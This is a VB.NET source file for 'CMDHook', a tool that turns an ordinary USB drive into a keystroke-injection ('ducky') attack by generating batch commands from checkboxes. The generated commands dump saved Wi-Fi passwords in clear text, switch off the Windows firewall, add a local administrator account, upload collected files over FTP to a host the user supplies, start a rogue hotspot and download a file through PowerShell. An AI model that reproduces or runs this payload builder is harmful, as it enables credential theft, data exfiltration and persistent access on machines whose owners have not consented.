Imports System.IO
Imports System.Text.RegularExpressions
Public Class Hook
#Region "Pre-Strings"
    Dim cmd_presetup As String = "color f2"
    Dim comp_inf As String = "   "
    Dim usb_inf As String = "   "
    Dim prog_inf As String = "   "
    Dim net_inf As String = "   "
    Dim wprof_inf As String = "   "
    Dim disable_fir As String = "   "
    Dim ftp_upload As String = "   "
    Dim add_adminuser As String = "   "
    Dim wifi_hotspot As String = "   "
    Dim downloadexe As String = "   "
    Dim SaveLogTemporary As String = " >> """ & My.Application.Info.DirectoryPath & "\log.txt"""
    Dim DestinationLoc As String
    Dim scripts_strng As String
#End Region

    Private Sub Hook_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        code_box.Text = cmd_presetup
        Label15.Text = "e.g: C:\Users\" & Environment.UserName & "\Documents\WindowsLog.txt"
    End Sub

    Private Sub RemoveClearLines() 'Remove clear lines. If the string value is "   ", this function remove it.
        Dim lines As New List(Of String)
        lines = code_box.Lines.ToList
        Dim FilterText = "   "

        For i As Integer = lines.Count - 1 To 0 Step -1
            If Regex.IsMatch(lines(i), FilterText) Then
                lines.RemoveAt(i)
            End If
        Next

        code_box.Lines = lines.ToArray
    End Sub

    Private Sub CodeBoxText() 'Update code in text editor.
        code_box.Text = cmd_presetup & vbNewLine & comp_inf & vbNewLine & usb_inf & vbNewLine & prog_inf & vbNewLine &
            net_inf & vbNewLine & wprof_inf & vbNewLine & disable_fir & vbNewLine & ftp_upload & vbNewLine & add_adminuser &
            vbNewLine & wifi_hotspot & vbNewLine & downloadexe & vbNewLine & DestinationLoc
        CheckedBox()
    End Sub

    Private Sub CheckedBox() 'Check checked box's and changes the strings value to save methods.
        If CheckBox17.Checked = True Then 'Save method: (1) Save USB. Add save line, and function to cmd commands.
            If CheckBox1.Checked = True Then
                comp_inf = comp_inf + SaveLogTemporary
            End If
        End If
        If CheckBox20.Checked = True Then 'Save method: (2) Upload to FTP. Add save line, and function to cmd commands.

        End If
        If CheckBox20.Checked = True Then 'Save method: (3) Send as email. Add save line, and function to cmd commands.

        End If
        If CheckBox20.Checked = True Then 'Save method: (4) Save to computer. Add save line, and function to cmd commands.
#Region "Save to log (AppStartupPatch + \log.txt) + Move to location (4)"
            If CheckBox1.Checked = True Then
                If comp_inf.Contains(SaveLogTemporary) Then
                Else
                    comp_inf = comp_inf + SaveLogTemporary
                End If
            End If
            If CheckBox2.Checked = True Then
                If usb_inf.Contains(SaveLogTemporary) Then
                Else
                    usb_inf = usb_inf + SaveLogTemporary
                End If
            End If
            If CheckBox5.Checked = True Then
                If prog_inf.Contains(SaveLogTemporary) Then
                Else
                    prog_inf = prog_inf + SaveLogTemporary
                End If
            End If
            If CheckBox8.Checked = True Then
                If net_inf.Contains(SaveLogTemporary) Then
                Else
                    net_inf = net_inf + SaveLogTemporary
                End If
            End If
            If CheckBox11.Checked = True Then
                If wprof_inf.Contains(SaveLogTemporary) Then
                Else
                    wprof_inf = wprof_inf + SaveLogTemporary
                End If
            End If
            If CheckBox4.Checked = True Then
                If disable_fir.Contains(SaveLogTemporary) Then
                Else
                    disable_fir = disable_fir + SaveLogTemporary
                End If
            End If
            If CheckBox6.Checked = True Then
                If ftp_upload.Contains(SaveLogTemporary) Then
                Else
                    ftp_upload = ftp_upload + SaveLogTemporary
                End If
            End If
            If CheckBox7.Checked = True Then
                If add_adminuser.Contains(SaveLogTemporary) Then
                Else
                    add_adminuser = add_adminuser + SaveLogTemporary
                End If
            End If
            If CheckBox10.Checked = True Then
                If wifi_hotspot.Contains(SaveLogTemporary) Then
                Else
                    wifi_hotspot = wifi_hotspot + SaveLogTemporary
                End If
            End If
            If CheckBox15.Checked = True Then
                If downloadexe.Contains(SaveLogTemporary) Then
                Else
                    downloadexe = downloadexe + SaveLogTemporary
                End If
            End If
            DestinationLoc = "copy """ & "" & My.Application.Info.DirectoryPath & "\log.txt""" & " """ & TextBox10.Text & """" &
                vbNewLine & "del /f """ & My.Application.Info.DirectoryPath & "\log.txt"""
#End Region
        End If
    End Sub

#Region "All script - Check box"
    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        'Get default computer information.
        If CheckBox1.Checked Then
            CheckBox1.BackColor = Color.LightBlue
            comp_inf = "systeminfo"
        Else
            CheckBox1.BackColor = Nothing
            comp_inf = "   "
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked Then
            CheckBox2.BackColor = Color.LightBlue
            usb_inf = "wmic path CIM_LogicalDevice where ""Description Like 'USB%'"" get /value"
        Else
            CheckBox2.BackColor = Nothing
            usb_inf = "   "
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox5_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked Then
            CheckBox5.BackColor = Color.Gold
            prog_inf = "wmic /output:C:\InstallList.txt product get name,version"
        Else
            CheckBox5.BackColor = Nothing
            prog_inf = "   "
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox8_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox8.CheckedChanged
        If CheckBox8.Checked Then
            CheckBox8.BackColor = Color.LightBlue
            If RadioButton2.Checked = True Then
                net_inf = "Netsh WLAN show drivers"
            End If
            If RadioButton4.Checked = True Then
                net_inf = "Netsh WLAN show profile name=""" & TextBox1.Text & """ key=clear"
            End If
        Else
            CheckBox8.BackColor = Nothing
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            net_inf = "   "
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox11_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox11.CheckedChanged
        If CheckBox11.Checked Then
            CheckBox11.BackColor = Color.LightBlue
            wprof_inf = "Netsh WLAN show profiles"
        Else
            CheckBox11.BackColor = Nothing
            wprof_inf = "   "
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked Then
            CheckBox4.BackColor = Color.Gold
            disable_fir = "NetSh Advfirewall set allprofiles state off"
        Else
            CheckBox4.BackColor = Nothing
            disable_fir = "   "
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox6_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked Then
            CheckBox6.BackColor = Color.LightBlue
            ftp_upload = "ftp" & vbNewLine & "open " & TextBox2.Text & vbNewLine &
                TextBox3.Text & vbNewLine & TextBox4.Text & vbNewLine & "mkdir CMDSudo" & vbNewLine &
                "cd CMDSudo" & vbNewLine & "put " & TextBox5.Text & vbNewLine & "disconnect" & vbNewLine & "quit"
        Else
            CheckBox6.BackColor = Nothing
            ftp_upload = "   "
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox7_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox7.CheckedChanged
        If CheckBox7.Checked Then
            CheckBox7.BackColor = Color.Gold
            add_adminuser = "net user /add " & admin_username.Text & " " & admin_pass.Text & vbNewLine &
                "net localgroup administrators " & admin_username.Text & " /add"
        Else
            CheckBox7.BackColor = Nothing
            add_adminuser = "   "
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox10_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox10.CheckedChanged
        If CheckBox10.Checked Then
            CheckBox10.BackColor = Color.Gold
            wifi_hotspot = "netsh wlan set hostednetwork mode=allow ssid=" & ssid.Text & " " & "key=" & appass.Text &
                vbNewLine & "netsh wlan start hostednetwork"
        Else
            CheckBox10.BackColor = Nothing
            wifi_hotspot = "   "
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub
    Private Sub CheckBox15_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox15.CheckedChanged
        If CheckBox15.Checked Then
            CheckBox15.BackColor = Color.LightSalmon
            downloadexe = "powershell -command " & Chr(34) & "& " & "{ (New-Object Net.WebClient).DownloadFile(" &
                "'" & TextBox8.Text & "', " & "'" & TextBox7.Text & "') }"""
        Else
            CheckBox15.BackColor = Nothing
            downloadexe = "   "
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox17_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox17.CheckedChanged
        If CheckBox17.Checked Then
            CheckBox17.BackColor = Color.LightBlue
        Else
            CheckBox17.BackColor = Nothing
        End If
    End Sub

    Private Sub CheckBox18_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox18.CheckedChanged
        If CheckBox18.Checked Then
            CheckBox18.BackColor = Color.LightBlue
        Else
            CheckBox18.BackColor = Nothing
        End If
    End Sub

    Private Sub CheckBox19_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox19.CheckedChanged
        If CheckBox19.Checked Then
            CheckBox19.BackColor = Color.LightBlue
        Else
            CheckBox19.BackColor = Nothing
        End If
    End Sub

    Private Sub CheckBox20_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox20.CheckedChanged
        If CheckBox20.Checked Then
            CheckedBox()
            CheckBox20.BackColor = Color.LightBlue
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If adminuser.Visible Then
                adminuser.Hide()
            End If
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If save_to_comp.Visible = False Then
                save_to_comp.Visible = True
            End If
        Else
            CheckedBox()

            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If save_to_comp.Visible Then
                save_to_comp.Hide()
            End If
            CheckBox20.BackColor = Nothing
        End If
    End Sub
#End Region

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        code_editor.RichTextBox1.Text = code_box.Text
        code_editor.Show()
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        If CheckBox8.Checked = True Then
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If adminuser.Visible Then
                adminuser.Hide()
            End If
            If save_to_comp.Visible Then
                save_to_comp.Hide()
            End If
            If netw_info.Visible = True Then
                netw_info.Visible = False
            Else
                netw_info.Show()
            End If
        Else
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If netw_info.Visible = True Then
                netw_info.Visible = False
            Else
                netw_info.Show()
            End If
            CheckBox8.Checked = True
            If RadioButton2.Checked = True Then
                RadioButton2.BackColor = Color.LightBlue
            End If
        End If
    End Sub

    Private Sub RadioButton4_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton4.CheckedChanged
        If CheckBox8.Checked = True Then
            If RadioButton4.Checked = True Then
                RadioButton4.BackColor = Color.LightBlue
                net_inf = "Netsh WLAN show profile name=""" & TextBox1.Text & """ key=clear"
                Label2.Show()
                TextBox1.Show()
            Else
                RadioButton4.BackColor = Nothing
                Label2.Hide()
                TextBox1.Hide()
            End If
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        If CheckBox8.Checked = True Then
            If RadioButton2.Checked = True Then
                RadioButton2.BackColor = Color.LightBlue
                net_inf = "Netsh WLAN show drivers"
            Else
                RadioButton2.BackColor = Nothing
            End If
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        net_inf = "Netsh WLAN show profile name=""" & TextBox1.Text & """ key=clear"
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        If CheckBox6.Checked = True Then
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Visible = False
            Else
                ftp_file.Show()
            End If
        Else
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Visible = False
            Else
                ftp_file.Show()
            End If
            CheckBox6.Checked = True
        End If
    End Sub

    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        If CheckBox7.Checked = True Then
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            Else
                adminuser.Show()
            End If
        Else
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            Else
                adminuser.Show()
            End If
            CheckBox7.Checked = True
        End If
    End Sub

    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        If CheckBox10.Checked = True Then
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            Else
                hotspot_panel.Show()
            End If
        Else
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            Else
                hotspot_panel.Show()
            End If
            CheckBox10.Checked = True
        End If
    End Sub

    Private Sub PictureBox9_Click(sender As Object, e As EventArgs) Handles PictureBox9.Click
        If CheckBox15.Checked = True Then
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            Else
                downrunpanel.Show()
            End If
        Else
            If netw_info.Visible = True Then
                netw_info.Hide()
            End If
            If adminuser.Visible = True Then
                adminuser.Hide()
            End If
            If save_to_comp.Visible = True Then
                save_to_comp.Hide()
            End If
            If hotspot_panel.Visible = True Then
                hotspot_panel.Hide()
            End If
            If ftp_file.Visible = True Then
                ftp_file.Hide()
            End If
            If downrunpanel.Visible = True Then
                downrunpanel.Hide()
            Else
                downrunpanel.Show()
            End If
            CheckBox15.Checked = True
        End If
    End Sub
    Private Sub RefreshFTPLines()
        ftp_upload = "ftp" & vbNewLine & "open " & TextBox2.Text & vbNewLine &
                TextBox3.Text & vbNewLine & TextBox4.Text & vbNewLine & "mkdir CMDSudo" & vbNewLine &
                "cd CMDSudo" & vbNewLine & "put " & TextBox5.Text & vbNewLine & "disconnect" & vbNewLine & "quit"
    End Sub
    Private Sub RefreshAdminDatas()
        add_adminuser = "net user /add " & admin_username.Text & " " & admin_pass.Text & vbNewLine &
                "net localgroup administrators " & admin_username.Text & " /add"
    End Sub

    Private Sub RefreshHotspotDatas()
        wifi_hotspot = "netsh wlan set hostednetwork mode=allow ssid=" & ssid.Text & " " & "key=" & appass.Text &
                vbNewLine & "netsh wlan start hostednetwork"
    End Sub

    Private Sub RefreshDownloadAndExct()
        downloadexe = "powershell -command " & Chr(34) & "& " & "{ (New-Object Net.WebClient).DownloadFile(" &
                "'" & TextBox8.Text & "', " & "'" & TextBox7.Text & "') }"""
    End Sub

    Private Sub scripts_Tick(sender As Object, e As EventArgs) Handles scripts.Tick
        If CheckBox6.Checked = True Then
            RefreshFTPLines()
        End If
        If CheckBox7.Checked = True Then
            RefreshAdminDatas()
        End If
        If CheckBox10.Checked = True Then
            RefreshHotspotDatas()
        End If
        If CheckBox15.Checked = True Then
            RefreshDownloadAndExct()
        End If
        CodeBoxText()
        RemoveClearLines()
    End Sub

    Private Sub CheckBox16_CheckedChanged(sender As Object, e As EventArgs)

    End Sub
    Dim change As Integer = 0

    Private Sub change_name_Tick(sender As Object, e As EventArgs) Handles change_name.Tick
        change += 1
        If change = 0 Then
            Me.Text = "CMDHook - Make ducky from a normal pendrive"
        End If
        If change = 1 Then
            Me.Text = "CMDHook - Version: 1.0"
        End If
        If change = 2 Then
            Me.Text = "CMDHook - Use in your computer only!"
        End If
        If change = 3 Then
            Me.Text = "CMDHook - Thanks for using!"
        End If
        If change = 4 Then
            Me.Text = "CMDHook - Paypal: helper4away@gmail.com"
            change = -1
        End If

        'List all of flashdrives connected
        Dim folder = New FolderBrowserDialog()
        Dim drives = System.IO.DriveInfo.GetDrives()
        Dim usbDrive = drives.FirstOrDefault(Function(m) m.DriveType = System.IO.DriveType.Removable)

        For i As Integer = 0 To drives.Count - 1

            If drives(i).DriveType = System.IO.DriveType.Removable Then
                'Codes will not run if there were no removable device
                folder.SelectedPath = usbDrive.RootDirectory.FullName
                If ComboBox1.Items.Contains(folder.SelectedPath) Then
                    ComboBox1.Enabled = True
                Else
                    ComboBox1.Items.Add(folder.SelectedPath)
                End If
            End If

        Next i

        'Enable button for save
        Select Case scripts_strng
        '1,2,4,5,6,7,8,10,11,15
            Case "1"
                scripts_strng = "CheckBox1"

        End Select
    End Sub

    Private Sub Label15_Click(sender As Object, e As EventArgs) Handles Label15.Click
        TextBox10.Text = "C:\Users\" & Environment.UserName & "\Documents\WindowsLog.txt"
    End Sub

    Private Sub TextBox10_TextChanged(sender As Object, e As EventArgs) Handles TextBox10.TextChanged

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        ' save to pendrive
    End Sub
End Class
